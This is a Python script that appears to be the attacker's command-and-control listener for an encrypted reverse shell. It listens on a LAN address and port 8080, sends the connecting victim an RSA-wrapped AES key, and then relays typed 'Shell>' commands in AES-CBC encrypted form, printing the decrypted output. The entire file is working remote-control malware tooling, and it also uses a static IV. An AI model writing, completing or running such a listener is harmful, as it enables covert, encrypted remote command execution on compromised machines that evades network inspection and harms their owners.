import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random


def AESFunc(message):
    publicKey = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAo41dU8F/yw5NvgBvfvMB
cW6kHxWG3lunMp0y/8D5oHOBzuXrB6DR5O0cK768NwQpueDJIzBUmMO7rwF+UHZG
4h20R8v4WMDItIr9NLrNNMPhXDEIDo9A9NaMsa/PtHztsnlfJbm/sOffwScnKGrH
5cmfzXu2AQA0vA8DUDdr3aJH5gRrPT6t+MNSBh3OskP5lfFa83kk9wwQp3RmDu+R
Sc4x0/4TiBXxZ8o9SikgcYmICUvitd1WOu4TDCdDFBM/aEwWQ5YpG0Oc/isiUwyX
bqJJQ+SScYw2b6jNkxzlw7/B2ZfG1sEubo0BoXHRqMTkzJyi76o8SCG/dWtMHaSg
JXeSHwPxVcIppZ6D8jQt8r2tUaWydSa/xnVfSTZBHe/9PKEsu292tpwr4DD7E4ty
33OmYWreNV8TZ9MK1npf2Lkwq/kqZO/wt3MqoUdd19hc83oYYD19B0PxtMkRmHIk
EZANa986Fws/1Q9i6ZF1KzskZ+Bg9vwCLzUyUWtKd8a1Z97qR1ETOBv9PhuMwIlS
C4KBCuFNnvwdiXthuCalodwKu1ZjOMsX5lFzNPfUVwGg7y4GKI/VKaugdpCAdkiV
kYKEfXrZ30eC2eXR0HuSNT/wCTbzHAYqlgHO8lLoZNubSTyBMoDIqEWRuApjjTFG
IYlvCv4afkIxMzzSAgBPHLkCAwEAAQ==
-----END PUBLIC KEY-----"""
    publicKeyAfterImport = RSA.importKey(publicKey)
    encryptoMe = PKCS1_OAEP.new(publicKeyAfterImport)
    encryptedData = encryptoMe.encrypt(message)
    return encryptedData


def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message


def decrypt(data):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(data)
    decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.bind(('192.168.68.119', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')

    conn, addr = s.accept()
    print(key.encode())
    conn.send(AESFunc(key.encode()))

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result).decode())
            except:
                print("[-] unable to decrypt/receive data!")


IV = b"H" * 16

key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for i in range(0, 32))

connect()

